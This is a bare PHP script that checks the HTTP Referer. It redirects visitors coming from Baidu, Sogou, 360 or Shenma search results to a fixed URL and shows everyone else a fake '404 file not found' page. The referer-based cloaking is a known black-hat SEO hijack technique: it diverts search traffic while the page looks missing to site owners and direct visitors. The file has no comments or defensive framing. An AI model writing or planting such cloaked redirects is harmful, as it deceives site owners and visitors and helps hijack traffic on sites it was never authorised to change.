<?php
header("Content-type: text/html; charset=utf-8");
$url = 'http://www.baidu.com';
if(isset($_SERVER['HTTP_REFERER'])){
    $ref = strtolower($_SERVER['HTTP_REFERER']);
    if(strpos($ref,'baidu.com')){
        header('Location: '.$url);
    }else if(strpos($ref,'sogou.com')){
        header('Location: '.$url);
    }else if(strpos($ref,'360.cn')){
        header('Location: '.$url);
    }else if(strpos($ref,'sm.cn')){
        header('Location: '.$url);
    }else{
        header('HTTP/1.1 404 Not Found');
        echo '404文件不存在';
    }
}else{
    header('HTTP/1.1 404 Not Found');
    echo '404文件不存在';
}
